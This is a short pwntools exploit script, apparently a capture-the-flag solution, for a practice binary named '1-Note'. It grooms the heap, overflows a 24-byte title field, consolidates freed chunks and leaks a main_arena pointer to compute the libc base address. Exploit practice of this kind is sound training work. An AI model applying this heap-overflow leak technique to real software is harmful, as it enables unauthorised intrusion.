#!/bin/env python3

from pwn import *

author = b"Slimicide"

elf = context.binary = ELF("1-Note")
libc = ELF(elf.runpath + b"/libc.so.6")

gs = """
continue
"""

if args.GDB:
	p = gdb.debug("./1-Note", gdbscript=gs)
else:
	p = process("./1-Note")

p.recv(4096)

def read_note():
	p.sendline(b"0")
	p.recvuntil(b"AAAAAAAAAAAAAAAAAAAAAAAA\x11\x02\n")
	return p.recvuntil(b"\x7f")

def change_title(x):
	p.sendline(b"1")
	p.recv(4096)
	p.sendline(x)
	p.recv(4096)

def change_contents(x):
	p.sendline(b"2")
	p.recv(4096)
	p.sendline(x)
	p.recv(4096)

def option_three():
	p.sendline(b"3")
	p.recv(4096)

def option_four():
	p.sendline(b"4")
	p.recv(4096)

def option_five():
	p.sendline(b"5")
	p.recv(4096)

def change_author(x):
	p.sendline(b"6")
	p.recv(4096)
	p.sendline(x)
	p.recv(4096)

def delete_note_contents():
	p.sendline(b"7")
	p.recv(4096)

def quit_binary():
	p.sendline(b"8")

#Set the chunks on the heap in a deliberate order.
change_title(b"")
change_contents(b"")
option_three()
change_author(author)

#Free the note, overflow, remainder & allocate
delete_note_contents()
change_title(b"A"*24) #+\0
option_four()
option_five()

#Consolidate, reallocate
option_four()
option_three()
change_contents(b"")

leak = read_note()
leak += b"\x00\x00" #u64() requires an 8-byte input

main_arena_0x58 = u64(leak) - 0x290 #I have no idea why.
libc_base = main_arena_0x58 - (libc.sym.main_arena + 0x58)

libc.address = libc_base
info(f"LIBC @ {hex(libc.address)}")

p.interactive()